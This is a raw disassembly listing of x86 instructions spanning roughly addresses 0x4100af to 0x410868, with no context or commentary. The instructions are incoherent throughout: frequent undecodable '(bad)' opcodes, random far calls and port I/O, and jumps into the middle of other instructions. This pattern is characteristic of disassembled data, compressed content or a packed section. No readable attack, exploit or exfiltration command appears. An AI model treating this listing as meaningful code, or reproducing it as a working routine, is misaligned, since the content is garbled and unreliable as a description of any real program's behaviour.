  4100af:	(bad)  
  4100b0:	fsqrt  
  4100b2:	jmp    0xc461e090
  4100b7:	fld    st(3)
  4100b9:	shl    BYTE PTR [ebp-0x1485930a],cl
  4100bf:	mov    dl,0x5b
  4100c1:	cmc    
  4100c2:	call   0xf049:0xdb62444d
  4100c9:	lods   eax,DWORD PTR ds:[esi]
  4100ca:	dec    ebp
  4100cb:	(bad)  
  4100cc:	pop    eax
  4100cd:	pop    ss
  4100ce:	jl     0x4100f8
  4100d0:	pop    ds
  4100d1:	sbb    ebp,DWORD PTR [eax]
  4100d3:	jns    0x410071
  4100d5:	imul   eax,eax,0xffffffcf
  4100d8:	and    BYTE PTR [ecx-0x21c4bfe8],ah
  4100de:	bndstx [ecx+0x32],(bad)
  4100e2:	push   cs
  4100e3:	inc    edx
  4100e4:	stos   DWORD PTR es:[edi],eax
  4100e5:	cwde   
  4100e6:	adc    edx,DWORD PTR [ecx]
  4100e8:	sbb    eax,0x7c91e701
  4100ed:	(bad)  
  4100ee:	out    dx,eax
  4100ef:	pop    ebp
  4100f0:	arpl   WORD PTR [edx+0x39],cx
  4100f3:	and    eax,0x9f351ebc
  4100f8:	xchg   ebx,eax
  4100f9:	adc    cl,BYTE PTR [esi-0x45]
  4100fc:	(bad)  
  4100fd:	cmp    esp,DWORD PTR [ecx+0x17]
  410100:	inc    edx
  410101:	jmp    DWORD PTR [edx]
  410103:	cmp    DWORD PTR [ebx+0x26],esi
  410106:	repz (bad) 
  410109:	ins    BYTE PTR es:[edi],dx
  41010a:	add    eax,0xb98a80c2
  41010f:	xchg   edi,eax
  410110:	pop    eax
  410111:	mov    edi,0x5e184bcc
  410116:	arpl   bp,ax
  410118:	jecxz  0x410173
  41011a:	push   ecx
  41011b:	xor    eax,DWORD PTR [edi-0x6491ffb7]
  410121:	lahf   
  410122:	aas    
  410123:	icebp  
  410124:	push   ebp
  410125:	push   es
  410126:	in     eax,dx
  410127:	add    ebx,DWORD PTR [edi]
  410129:	rol    BYTE PTR [eax],1
  41012b:	dec    ebx
  41012c:	jbe    0x410165
  41012e:	dec    edx
  41012f:	aas    
  410130:	add    BYTE PTR [esi],dh
  410132:	mov    DWORD PTR ds:0x927c8ee8,ecx
  410138:	xchg   esi,eax
  410139:	add    dl,BYTE PTR [eax-0x43]
  41013c:	sti    
  41013d:	mov    al,0x6f
  41013f:	(bad)  
  410140:	xchg   edx,eax
  410141:	iret   
  410142:	sub    BYTE PTR [ecx+0x74],bl
  410145:	cmp    BYTE PTR [ecx],bl
  410147:	mov    ebx,0x9344f1b8
  41014c:	xor    DWORD PTR [esi+0x7447025f],edx
  410152:	mov    DWORD PTR [esi],ecx
  410154:	xor    ah,BYTE PTR [edi]
  410156:	test   DWORD PTR [esi+0x5e2b4abc],ebp
  41015c:	adc    al,0x32
  41015e:	out    dx,al
  41015f:	or     BYTE PTR [ecx-0x19dbaa1],bh
  410165:	cld    
  410166:	xor    ah,BYTE PTR [ebx]
  410168:	and    BYTE PTR [eax],ch
  41016a:	stos   BYTE PTR es:[edi],al
  41016b:	jae    0x41011f
  41016d:	test   eax,0x9e02ca52
  410172:	aam    0xd
  410174:	adc    DWORD PTR [eax+0x1c0e56a9],eax
  41017a:	mov    ds:0x6bf0838d,al
  41017f:	daa    
  410180:	in     eax,0xfe
  410182:	xor    eax,0xf9665e5c
  410187:	inc    esp
  410188:	dec    ecx
  410189:	and    DWORD PTR [ebx-0x3b],eax
  41018c:	ins    BYTE PTR es:[edi],dx
  41018d:	cwde   
  41018e:	pop    edx
  41018f:	add    dh,al
  410191:	js     0x41015f
  410193:	retf   0xb105
  410196:	sub    ebp,DWORD PTR [edi+0x6a]
  410199:	ja     0x4101cb
  41019b:	aaa    
  41019c:	inc    ecx
  41019d:	inc    esp
  41019e:	cmp    ch,BYTE PTR [esi]
  4101a0:	test   DWORD PTR es:[edi-0x5645336b],edi
  4101a7:	add    bh,ch
  4101a9:	out    0x51,al
  4101ab:	sbb    bh,BYTE PTR [ecx+0x68]
  4101ae:	fdiv   DWORD PTR [edi-0x58187948]
  4101b4:	cmp    eax,0x2ff1c7fa
  4101b9:	stc    
  4101ba:	pop    ecx
  4101bb:	or     esp,ebp
  4101bd:	lds    esp,FWORD PTR [ecx-0x571bdad2]
  4101c3:	lods   eax,DWORD PTR ds:[esi]
  4101c5:	jb     0x4101ea
  4101c7:	sbb    al,0xa
  4101c9:	jmp    FWORD PTR [edi+0x60926773]
  4101cf:	rcl    edi,0x5f
  4101d2:	aam    0x50
  4101d4:	lock in al,dx
  4101d6:	xchg   ebx,eax
  4101d7:	sub    al,0x91
  4101d9:	aad    0xd8
  4101db:	mov    ebp,edx
  4101dd:	xchg   edx,eax
  4101de:	fild   DWORD PTR [ecx+0x6f]
  4101e1:	push   ss
  4101e2:	and    al,0xc9
  4101e4:	push   eax
  4101e5:	out    dx,al
  4101e6:	inc    eax
  4101e7:	push   esi
  4101e8:	inc    edi
  4101e9:	mov    ebx,0x9850f4f5
  4101ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101ef:	outs   dx,DWORD PTR ds:[esi]
  4101f0:	loop   0x410216
  4101f2:	call   0x9534:0xd4b418ed
  4101f9:	sub    ah,BYTE PTR [ecx]
  4101fb:	dec    ecx
  4101fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101fd:	bound  eax,QWORD PTR [ecx-0x2a]
  410200:	gs pop ds
  410202:	mov    bl,0x86
  410204:	into   
  410205:	call   0x71eb:0x29ff90fa
  41020c:	pusha  
  41020d:	inc    ebx
  41020e:	dec    eax
  41020f:	xchg   BYTE PTR [ebx],ch
  410211:	lahf   
  410212:	clc    
  410213:	icebp  
  410214:	sbb    eax,ecx
  410216:	or     DWORD PTR [ebx+edi*4-0x1d5452b6],edx
  41021d:	sbb    eax,0x5f913ea7
  410222:	scas   al,BYTE PTR es:[edi]
  410223:	dec    esp
  410224:	add    DWORD PTR [edx-0xf],esi
  410227:	rcr    dl,0xf1
  41022a:	add    esp,DWORD PTR [ebp-0x46]
  41022d:	jl     0x4102a9
  41022f:	fcom   DWORD PTR [ebp-0x42]
  410232:	adc    eax,0x4434e708
  410237:	inc    edi
  410238:	pop    es
  410239:	push   esp
  41023a:	adc    DWORD PTR [edx],ecx
  41023c:	dec    esi
  41023d:	inc    ebp
  41023e:	mov    bl,0x40
  410240:	out    0xdf,al
  410242:	into   
  410243:	aad    0x33
  410245:	xor    eax,0x4f0a0dc9
  41024a:	and    al,0xb3
  41024c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41024d:	push   cs
  41024e:	repnz and ch,dh
  410251:	xchg   esp,eax
  410252:	dec    ecx
  410253:	push   ecx
  410254:	pop    ebx
  410255:	iret   
  410256:	xor    DWORD PTR [ecx],0x60da3675
  41025c:	shl    DWORD PTR [edi-0x46],cl
  41025f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410260:	jecxz  0x410215
  410262:	mov    edx,0x54b27d48
  410267:	mov    edx,0xdd320462
  41026c:	test   BYTE PTR [edi],0x41
  41026f:	mov    ebx,fs
  410271:	cmc    
  410272:	mov    ebp,DWORD PTR [edi-0x50f1df32]
  410278:	mov    eax,ds:0xdca71382
  41027d:	cmp    DWORD PTR [ecx+0x31fcefc3],0x54
  410284:	movups xmm1,XMMWORD PTR ds:0x7db29150
  41028b:	push   0x6d
  41028d:	nop
  41028e:	fmulp  st(1),st
  410290:	hlt    
  410291:	rol    BYTE PTR es:[eax-0x5],0x97
  410296:	mov    DWORD PTR [ebx],esi
  410298:	call   0x850df3cc
  41029d:	inc    DWORD PTR [edi+0x3785921a]
  4102a3:	pop    esp
  4102a4:	(bad)  
  4102a6:	out    dx,al
  4102a7:	mov    WORD PTR [edx],ds
  4102a9:	mov    eax,ds:0x1b2f2328
  4102ae:	pop    ebx
  4102af:	cwde   
  4102b0:	in     eax,dx
  4102b1:	scas   al,BYTE PTR es:[edi]
  4102b2:	vunpckhps ymm5,ymm2,ymm4
  4102b6:	pop    ebp
  4102b7:	fisttp DWORD PTR [edi-0x46]
  4102ba:	inc    esi
  4102bb:	pop    edi
  4102bc:	sub    ch,BYTE PTR [edx]
  4102be:	pop    ss
  4102bf:	mov    ch,0x74
  4102c1:	mov    esi,0xf538c900
  4102c6:	retf   
  4102c7:	out    dx,eax
  4102c8:	fs push edi
  4102ca:	lods   eax,DWORD PTR ds:[esi]
  4102cb:	pop    ss
  4102cc:	fcmovnbe st,st(4)
  4102ce:	push   ss
  4102cf:	jecxz  0x41032b
  4102d1:	pushw  0xc66b
  4102d5:	mov    ds:0x92cd48e3,al
  4102da:	in     al,dx
  4102db:	mov    al,ds:0xd3d0fea8
  4102e0:	daa    
  4102e1:	xor    ah,BYTE PTR [edi-0xd]
  4102e4:	jbe    0x41034b
  4102e6:	mov    esi,0xa05445df
  4102eb:	mov    ds:0x14ccb898,al
  4102f0:	je     0x410305
  4102f2:	scas   al,BYTE PTR es:[edi]
  4102f3:	call   0x12e29650
  4102f8:	sub    DWORD PTR [esi-0x1f],ebp
  4102fb:	jo     0x410292
  4102fd:	jle    0x410370
  4102ff:	pushf  
  410300:	mov    ecx,0x2af0c89c
  410305:	fstp   DWORD PTR [esi-0x15]
  410308:	daa    
  410309:	dec    esp
  41030a:	xor    BYTE PTR [ebx],0xf0
  41030d:	xchg   BYTE PTR [ecx],dh
  41030f:	xor    dh,BYTE PTR [eax+esi*8+0x2b]
  410313:	dec    esp
  410314:	adc    ebp,DWORD PTR [edi+edx*1]
  410317:	dec    ecx
  410318:	ficom  WORD PTR [edx+0x281caa12]
  41031e:	lock inc ecx
  410320:	cmp    BYTE PTR gs:[eax+0x4780dea],dh
  410327:	in     al,dx
  410328:	or     eax,0x3657321a
  41032d:	mov    ds:0xfa619cdb,eax
  410332:	dec    esi
  410333:	in     eax,dx
  410334:	loopne 0x410366
  410336:	xchg   edx,eax
  410337:	in     al,0x23
  410339:	xor    al,0x90
  41033b:	cmp    BYTE PTR [eax+ecx*4+0x656ea922],dl
  410342:	pushf  
  410343:	dec    ebx
  410344:	mov    bh,0xe7
  410346:	mov    edi,ebp
  410348:	addr16 mov ah,0x54
  41034b:	orps   xmm2,XMMWORD PTR [ecx+ebp*2]
  41034f:	fdiv   DWORD PTR [esi+0x7a]
  410352:	mov    ah,0x95
  410354:	adc    bh,BYTE PTR [ecx-0x1b4e728e]
  41035a:	jne    0x4102fb
  41035c:	xchg   esp,eax
  41035d:	fwait
  41035e:	retf   0x4a97
  410361:	xchg   edx,eax
  410362:	jb     0x41033a
  410364:	pop    edx
  410365:	aad    0x45
  410367:	mov    ebx,0x451afc17
  41036c:	cli    
  41036d:	gs aaa 
  41036f:	in     eax,dx
  410370:	dec    ebx
  410371:	pushf  
  410372:	add    ch,bl
  410374:	shr    ch,1
  410376:	mov    ds:0x165a4f5d,eax
  41037b:	dec    esi
  41037c:	mov    cl,0x20
  41037e:	adc    edi,DWORD PTR [ecx-0x75]
  410381:	mov    al,ds:0x5abdf5a
  410386:	push   es
  410387:	cld    
  410388:	and    esp,DWORD PTR [ecx+edx*4-0x3d480ece]
  41038f:	ins    BYTE PTR es:[edi],dx
  410390:	jp     0x4103ee
  410392:	mov    ds:0x538e582,al
  410397:	mov    eax,ds:0x34cf54dd
  41039c:	cld    
  41039d:	cwde   
  41039e:	popf   
  41039f:	pop    eax
  4103a0:	mov    eax,0xccffec07
  4103a5:	inc    ebp
  4103a6:	push   edx
  4103a7:	inc    BYTE PTR [edx]
  4103a9:	cmp    eax,0x3201a518
  4103ae:	pop    edx
  4103af:	dec    edi
  4103b0:	mov    cl,0x74
  4103b2:	jno    0x410399
  4103b4:	mov    ch,BYTE PTR [esi]
  4103b6:	add    bh,BYTE PTR [esi+0x5f]
  4103b9:	or     eax,0xa25c7694
  4103be:	cmp    BYTE PTR [edx+eiz*1+0x75],ch
  4103c2:	test   edi,esi
  4103c4:	in     al,dx
  4103c5:	inc    ecx
  4103c6:	stos   BYTE PTR es:[edi],al
  4103c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103c8:	xor    cl,BYTE PTR ds:0x3b906ce6
  4103ce:	and    esi,esi
  4103d0:	add    eax,0x256701dc
  4103d5:	inc    esi
  4103d6:	dec    ecx
  4103d7:	cwde   
  4103d8:	sub    al,0x9b
  4103da:	call   FWORD PTR [edx+0x1e1e54ce]
  4103e0:	adc    eax,0xfe3e72c0
  4103e5:	or     BYTE PTR [edi-0x1d20c4a3],cl
  4103eb:	cmp    eax,0x13c2e7be
  4103f0:	mov    esp,DWORD PTR [ebx+0xa]
  4103f3:	outs   dx,DWORD PTR ds:[esi]
  4103f4:	pop    edi
  4103f5:	mov    ecx,0x11ff8bbe
  4103fa:	mov    bh,0xd0
  4103fc:	push   esi
  4103fd:	sub    BYTE PTR [edi],bl
  4103ff:	in     al,dx
  410400:	imul   esp,DWORD PTR [ebx],0xffffffc2
  410403:	dec    edi
  410404:	dec    edx
  410405:	test   eax,0x699f6d47
  41040a:	mov    esi,0xe88a7858
  41040f:	imul   ebp,DWORD PTR [ebx],0x6f04da6d
  410415:	and    al,0x4
  410417:	nop
  410418:	mov    esp,DWORD PTR [edx-0xb]
  41041b:	inc    ch
  41041d:	and    al,0x68
  41041f:	popa   
  410420:	mov    al,ds:0xe8b6324b
  410425:	mov    ds:0xf8d6f69,eax
  41042a:	ja     0x41045c
  41042c:	jnp    0x410438
  41042e:	fild   QWORD PTR [edi]
  410430:	or     edx,ebx
  410432:	jae    0x41043f
  410434:	cmp    cl,BYTE PTR [esi-0x1eb100c6]
  41043a:	fcomp  st(6)
  41043c:	aas    
  41043d:	mov    eax,ds:0xbb67fe8d
  410442:	jge    0x41045c
  410444:	jne    0x41041e
  410446:	jle    0x410488
  410448:	lods   al,BYTE PTR ds:[esi]
  410449:	jno    0x410465
  41044b:	jo     0x410464
  41044d:	mov    edi,0xa07f38e9
  410452:	int3   
  410453:	dec    ecx
  410454:	sbb    cl,BYTE PTR [ebx-0x44]
  410457:	jnp    0x4104d3
  410459:	xor    edx,DWORD PTR [esi+0x21a6281a]
  41045f:	(bad)  
  410460:	adc    eax,0xb0b1ce2c
  410465:	or     al,0x6c
  410467:	and    bl,BYTE PTR [ecx-0x863eccd]
  41046d:	sbb    esp,ecx
  41046f:	je     0x410423
  410471:	fdivp  st(0),st
  410473:	pop    ds
  410474:	out    0xad,eax
  410476:	inc    edi
  410477:	jb     0x410488
  410479:	fist   WORD PTR [eax+0x3b021504]
  41047f:	stos   BYTE PTR es:[edi],al
  410480:	repnz xor esp,DWORD PTR [eax]
  410483:	jge    0x4104c0
  410485:	mov    al,BYTE PTR [ebx]
  410487:	out    dx,al
  410488:	push   eax
  410489:	aas    
  41048a:	(bad)  
  41048b:	addr16 jnp 0x4104db
  41048e:	out    0xd3,eax
  410490:	fidivr DWORD PTR [ebx+0x3b]
  410493:	push   es
  410494:	cs jb  0x410421
  410497:	mov    ebx,0x7d5ebd63
  41049c:	adc    ebx,0x66df2e13
  4104a2:	les    ebx,FWORD PTR [esi+0xa]
  4104a5:	js     0x41048a
  4104a7:	sbb    ebp,DWORD PTR [eax+0x72a547c8]
  4104ad:	jp     0x4104d0
  4104af:	mov    dl,0xc7
  4104b1:	hlt    
  4104b2:	das    
  4104b3:	arpl   WORD PTR [eax],bx
  4104b5:	adc    DWORD PTR [eax+0x10],eax
  4104b8:	and    al,0x3e
  4104ba:	(bad)  
  4104bb:	fst    DWORD PTR [eax]
  4104bd:	nop
  4104be:	fild   QWORD PTR [eax-0x88f9afe]
  4104c4:	fs dec esp
  4104c6:	cmp    bl,0x3e
  4104c9:	inc    esi
  4104ca:	mov    DWORD PTR [edi+eiz*8-0x25],eax
  4104ce:	adc    DWORD PTR [esi],esp
  4104d0:	stos   BYTE PTR es:[edi],al
  4104d1:	xor    ah,cl
  4104d3:	aas    
  4104d4:	dec    edi
  4104d5:	mov    eax,ds:0x38731184
  4104da:	popa   
  4104db:	pop    edx
  4104dc:	pusha  
  4104dd:	sbb    BYTE PTR [ebx-0xe9afe0d],ah
  4104e3:	jecxz  0x410553
  4104e5:	in     eax,dx
  4104e6:	fcomp  QWORD PTR [ecx+0x79]
  4104e9:	jne    0x4104f3
  4104eb:	sub    esi,edi
  4104ed:	mov    bh,0x6c
  4104ef:	cmc    
  4104f0:	sbb    dl,bh
  4104f2:	daa    
  4104f3:	sbb    DWORD PTR [ebx+ebp*1-0x639c19ff],0x322e55ea
  4104fe:	ins    DWORD PTR es:[edi],dx
  4104ff:	inc    BYTE PTR [ecx-0x31f8d674]
  410505:	pop    eax
  410506:	mov    edi,fs
  410508:	iret   
  410509:	test   BYTE PTR [edx],bl
  41050b:	add    ch,BYTE PTR [esi+0x3093fead]
  410511:	mov    BYTE PTR [eax],0x8b
  410514:	scas   eax,DWORD PTR es:[edi]
  410515:	in     al,dx
  410516:	ins    BYTE PTR es:[edi],dx
  410517:	push   0xffffffaf
  410519:	jbe    0x410545
  41051b:	pop    esi
  41051c:	test   BYTE PTR gs:[esp+ebp*4+0x71bca265],dh
  410524:	jae    0x4104af
  410526:	(bad)  
  410528:	cmp    edx,DWORD PTR [edx+esi*4+0x4b]
  41052c:	int3   
  41052d:	cmp    ecx,DWORD PTR ds:0x73f94b3c
  410533:	mov    eax,0xb12a6a31
  410538:	cmp    al,0x8c
  41053a:	add    eax,0x454f8c92
  41053f:	fcomp  DWORD PTR [edi+0x44ee9531]
  410545:	mov    ds:0x4cfcb6a4,eax
  41054a:	je     0x410557
  41054c:	jmp    0x4105a4
  41054e:	jne    0x410524
  410550:	pop    ds
  410551:	shl    DWORD PTR ds:0x133be856,0x4e
  410558:	push   esp
  410559:	sbb    al,0x83
  41055b:	add    ebx,DWORD PTR [ebx]
  41055d:	push   ebp
  41055e:	add    al,0x80
  410560:	(bad)  
  410561:	cmp    al,BYTE PTR [edi]
  410563:	sbb    al,0xd0
  410565:	inc    ecx
  410566:	out    0x44,eax
  410568:	(bad)  
  410569:	or     BYTE PTR [eax],bl
  41056b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41056c:	push   edx
  41056d:	xchg   edx,eax
  41056e:	jb     0x4105b1
  410570:	ins    BYTE PTR es:[edi],dx
  410571:	(bad)  
  410572:	fistp  DWORD PTR [ecx-0x32]
  410575:	leave  
  410576:	jbe    0x410538
  410578:	jno    0x41055e
  41057a:	lds    ecx,FWORD PTR [edx+0x778b73bd]
  410580:	pop    esi
  410581:	and    DWORD PTR [edi+0x7a24e683],esi
  410587:	aad    0x36
  410589:	nop
  41058a:	dec    eax
  41058b:	or     ah,cl
  41058d:	push   ecx
  41058e:	jge    0x4105e5
  410590:	xor    ebp,DWORD PTR [eax]
  410592:	outs   dx,BYTE PTR ds:[esi]
  410593:	data16 fild QWORD PTR [edi+edi*2+0x1c365e48]
  41059b:	test   al,0xca
  41059d:	mov    ebp,0x9b2b1b2b
  4105a2:	ss xchg esp,eax
  4105a4:	out    dx,al
  4105a5:	jne    0x410624
  4105a7:	mov    ds:0xc0d8adc9,eax
  4105ac:	lahf   
  4105ad:	fnstenv ds:0xc80e2fa4
  4105b3:	cmp    esi,DWORD PTR [ebp+0x67]
  4105b6:	fld    DWORD PTR [ebx+0x770f3d31]
  4105bc:	inc    edx
  4105bd:	aaa    
  4105be:	push   es
  4105bf:	pop    edx
  4105c0:	push   edi
  4105c1:	(bad)  
  4105c2:	mov    dh,0x3
  4105c4:	inc    edi
  4105c5:	mov    ebp,DWORD PTR [ecx-0x6181e411]
  4105cb:	pushf  
  4105cc:	fs into 
  4105ce:	push   edi
  4105cf:	add    cl,dh
  4105d1:	bound  esp,QWORD PTR [esi+0x5f]
  4105d4:	je     0x410566
  4105d6:	push   eax
  4105d7:	push   0x5704f37e
  4105dc:	xchg   edx,eax
  4105dd:	stc    
  4105de:	jae    0x4105a8
  4105e0:	xchg   esp,eax
  4105e1:	dec    ecx
  4105e2:	ror    BYTE PTR [ebp-0x20],1
  4105e5:	adc    ch,ch
  4105e7:	loopne 0x410592
  4105e9:	fcomp  st(2)
  4105eb:	gs scas eax,DWORD PTR es:[edi]
  4105ed:	jmp    0x91ca:0x552da75b
  4105f4:	call   0x637260d9
  4105f9:	scas   eax,DWORD PTR es:[edi]
  4105fa:	jl     0x4105e4
  4105fc:	mov    es,WORD PTR [ebx]
  4105fe:	ror    DWORD PTR [ebp+0x71fa946b],1
  410604:	sbb    esp,ecx
  410606:	arpl   WORD PTR [edi],si
  410608:	pop    ebp
  410609:	jb     0x410612
  41060b:	ror    DWORD PTR [ebx-0x26],cl
  41060e:	dec    ebp
  41060f:	xor    DWORD PTR [ebx+0x10],0xffffff87
  410613:	jle    0x41064b
  410615:	or     BYTE PTR [ecx-0x74],ch
  410618:	mov    al,BYTE PTR [ecx+0x139ff32c]
  41061e:	jge    0x4105ed
  410620:	out    dx,al
  410621:	aam    0x77
  410623:	fld    TBYTE PTR [ebx-0x7a]
  410626:	jmp    0x4105ef
  410628:	retf   
  410629:	aad    0x5e
  41062b:	adc    eax,0xfad2f512
  410630:	jl     0x410608
  410632:	push   esp
  410633:	pop    esi
  410634:	lahf   
  410635:	into   
  410636:	push   es
  410637:	lock out 0xd2,eax
  41063a:	loope  0x41062d
  41063c:	mov    WORD PTR ds:0xa154e4bf,cs
  410642:	cwde   
  410643:	fstp   QWORD PTR [esi-0x48]
  410646:	and    BYTE PTR [ecx-0x3ae8c246],dl
  41064c:	ins    DWORD PTR es:[edi],dx
  41064d:	imul   ebp,DWORD PTR [ecx-0x78],0xd4c8dcb2
  410654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410655:	sbb    BYTE PTR [ecx-0x511bf9d5],ah
  41065b:	icebp  
  41065c:	lock xchg edx,eax
  41065e:	push   eax
  41065f:	outs   dx,BYTE PTR ds:[esi]
  410660:	adc    DWORD PTR [ecx-0x5b88735e],0x3a
  410667:	addr16 inc edx
  410669:	mov    esi,0x899e6205
  41066e:	stos   BYTE PTR es:[edi],al
  41066f:	mov    ah,0x87
  410671:	mov    bp,0x2f13
  410675:	or     bl,dh
  410677:	bound  ecx,QWORD PTR [edx-0x629e50bc]
  41067d:	sub    dh,BYTE PTR [ebp+0x3b97951b]
  410683:	ror    BYTE PTR [ebx],cl
  410685:	inc    ecx
  410686:	idiv   ecx
  410688:	pop    ds
  410689:	mov    esi,0x426e93fe
  41068e:	out    dx,eax
  41068f:	stc    
  410690:	loop   0x410687
  410692:	in     al,0x4c
  410694:	das    
  410695:	mul    BYTE PTR [edi+edx*4+0x6a]
  410699:	sbb    BYTE PTR [ebx+esi*2+0x62],0x42
  41069e:	stos   BYTE PTR es:[edi],al
  41069f:	icebp  
  4106a0:	mov    BYTE PTR [ebp-0x8],bl
  4106a3:	adc    ebx,DWORD PTR [ecx+0x4f]
  4106a6:	ror    dl,1
  4106a8:	dec    edi
  4106a9:	rcr    BYTE PTR [edi-0x27e70a8a],cl
  4106af:	gs ss pop ebp
  4106b2:	fmul   st(2),st
  4106b4:	sbb    DWORD PTR [edi+eiz*1-0x53],esp
  4106b8:	es and al,0xd3
  4106bb:	push   0x2f5684b4
  4106c0:	scas   eax,DWORD PTR es:[edi]
  4106c1:	loope  0x410649
  4106c3:	je     0x41069b
  4106c5:	xchg   edx,eax
  4106c6:	mov    ?,edi
  4106c8:	cmc    
  4106c9:	popf   
  4106ca:	les    ebp,FWORD PTR [ebp+0x71475708]
  4106d0:	or     eax,DWORD PTR [eax+eiz*2-0x7594a4a7]
  4106d7:	mov    cl,0x26
  4106d9:	mov    ds:0x320365b0,eax
  4106de:	(bad)  
  4106df:	fsubr  QWORD PTR cs:[edi+0x6a]
  4106e3:	into   
  4106e4:	aaa    
  4106e5:	xor    esp,DWORD PTR [edi]
  4106e7:	mov    al,0xa9
  4106e9:	jns    0x410721
  4106eb:	pop    edx
  4106ec:	jle    0x41066e
  4106ee:	pop    ss
  4106ef:	mov    ds:0x5a33f3ee,eax
  4106f4:	popf   
  4106f5:	(bad)  
  4106f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106f7:	in     al,dx
  4106f8:	sbb    eax,0xe9df0510
  4106fd:	xadd   DWORD PTR [ebp-0x6172172f],edi
  410704:	enter  0x396b,0x9
  410708:	xlat   BYTE PTR ds:[ebx]
  410709:	jnp    0x4106e4
  41070b:	pop    eax
  41070c:	in     al,dx
  41070d:	outs   dx,DWORD PTR ds:[esi]
  41070e:	aam    0xfc
  410710:	jne    0x4106d1
  410712:	int    0x8a
  410714:	xor    ecx,0xe3ececc1
  41071a:	inc    edx
  41071b:	mov    ah,0xc2
  41071d:	push   esp
  41071e:	test   DWORD PTR [edx-0x48],eax
  410721:	neg    DWORD PTR [esi]
  410723:	or     edi,ecx
  410725:	add    al,0x5b
  410727:	daa    
  410728:	sub    eax,0xf1709d9d
  41072d:	lock and eax,0x38521c49
  410733:	cmc    
  410734:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410735:	fist   WORD PTR [edx]
  410737:	push   ss
  410738:	push   0x99a96a56
  41073d:	clc    
  41073e:	push   0xfffffff3
  410740:	xchg   DWORD PTR [edx+0x7e8ed6b5],ebp
  410746:	sbb    BYTE PTR [ebx-0x43f39abf],al
  41074c:	dec    esp
  41074d:	outs   dx,DWORD PTR ds:[esi]
  41074e:	dec    ecx
  41074f:	test   DWORD PTR [ecx-0x305c2171],edi
  410755:	popa   
  410756:	dec    ecx
  410757:	dec    esi
  410758:	lods   eax,DWORD PTR ds:[esi]
  410759:	mov    ecx,0x343ce941
  41075e:	sub    BYTE PTR [esi],ch
  410760:	scas   al,BYTE PTR es:[edi]
  410761:	shl    edi,cl
  410763:	inc    ebx
  410764:	push   esp
  410765:	cmp    ch,bh
  410767:	or     al,0x17
  410769:	lea    ecx,[edi]
  41076b:	dec    ebp
  41076c:	add    dh,BYTE PTR [edx-0x5c]
  41076f:	jnp    0x41071a
  410771:	sbb    eax,0x67fa0c46
  410776:	jns    0x4107ac
  410778:	stos   BYTE PTR es:[edi],al
  410779:	xor    bl,al
  41077b:	pusha  
  41077c:	jnp    0x41075d
  41077e:	pop    es
  41077f:	cld    
  410780:	add    bl,BYTE PTR [ebx]
  410782:	call   DWORD PTR [ecx]
  410784:	mov    bh,0x43
  410786:	sub    edx,ebp
  410788:	(bad)  
  410789:	mov    esp,0x5e536481
  41078e:	push   ebx
  41078f:	mov    dh,BYTE PTR [ecx+0xb]
  410792:	inc    eax
  410793:	inc    esp
  410794:	sbb    eax,0x3f9c9ee7
  410799:	pop    ebx
  41079a:	cld    
  41079b:	std    
  41079c:	rcl    esp,1
  41079e:	pop    ss
  41079f:	sub    DWORD PTR [esi-0x489d08d3],ebx
  4107a5:	mov    esi,0x7c0ef93
  4107aa:	mov    edx,0x7a0a645c
  4107af:	sub    BYTE PTR [esi],0x59
  4107b2:	outs   dx,DWORD PTR ds:[esi]
  4107b3:	push   ss
  4107b4:	sub    eax,0x55c8e86e
  4107b9:	dec    edi
  4107ba:	fsubr  st,st(4)
  4107bc:	ret    
  4107bd:	gs push eax
  4107bf:	fldcw  WORD PTR [ecx+ebp*4+0x7d3c2246]
  4107c6:	xor    DWORD PTR ds:0x7b8533af,esi
  4107cc:	add    al,0x1b
  4107ce:	inc    ebp
  4107cf:	dec    edx
  4107d0:	jg     0x41079a
  4107d2:	pop    edi
  4107d3:	clc    
  4107d4:	aaa    
  4107d5:	outs   dx,BYTE PTR ds:[esi]
  4107d6:	fsubr  st(2),st
  4107d8:	clc    
  4107d9:	pop    edi
  4107da:	sbb    al,0x5e
  4107dc:	cwde   
  4107dd:	jp     0x410792
  4107df:	add    esp,eax
  4107e1:	retf   
  4107e2:	jg     0x4107bf
  4107e4:	icebp  
  4107e5:	dec    esp
  4107e6:	test   DWORD PTR [edx],esp
  4107e8:	pop    eax
  4107e9:	clc    
  4107ea:	mov    esp,0xedaa607a
  4107ef:	mov    eax,ds:0x839cdd22
  4107f4:	dec    edi
  4107f5:	adc    edx,DWORD PTR [ebx]
  4107f7:	mov    ds:0x87b07ef,eax
  4107fc:	stos   DWORD PTR es:[edi],eax
  4107fd:	ds jmp 0x41086e
  410800:	clc    
  410801:	push   edi
  410802:	jns    0x4107bc
  410804:	mov    ah,0x1a
  410806:	mov    BYTE PTR [ebx-0x601493bf],ah
  41080c:	cmp    eax,0x2722b709
  410811:	(bad)  
  410812:	daa    
  410813:	fs pop edx
  410815:	bound  eax,QWORD PTR [ecx-0x29]
  410818:	repnz popa 
  41081a:	(bad)  
  41081b:	push   esi
  41081c:	(bad)  
  41081d:	in     al,0x5
  41081f:	test   eax,0x8fd0855a
  410824:	mov    WORD PTR [ebx+0x6e60eb39],gs
  41082a:	fdiv   st,st(3)
  41082c:	sub    eax,0x7800bf2d
  410831:	outs   dx,BYTE PTR ds:[esi]
  410832:	loopne 0x4108a1
  410834:	or     al,0xb9
  410836:	vpunpckldq xmm4,xmm6,XMMWORD PTR [edx+0x6a12b351]
  41083e:	imul   ecx,DWORD PTR [ebx-0x44],0x10de81aa
  410845:	sti    
  410846:	hlt    
  410847:	pop    es
  410848:	ffreep st(1)
  41084a:	jb     0x410842
  41084c:	rol    BYTE PTR [ebp-0x29],1
  41084f:	mov    bl,0x6f
  410851:	mov    al,ds:0x1afcc0f9
  410856:	lods   al,BYTE PTR ds:[esi]
  410857:	cmp    edx,DWORD PTR [ebp+0x70]
  41085a:	outs   dx,BYTE PTR ds:[esi]
  41085b:	adc    ah,dl
  41085d:	and    BYTE PTR [ebx+0x7a],0x50
  410861:	hlt    
  410862:	cwde   
  410863:	(bad)
  410867:	inc    ebx
  410868:	stos   DWORD PTR es:[edi],eax
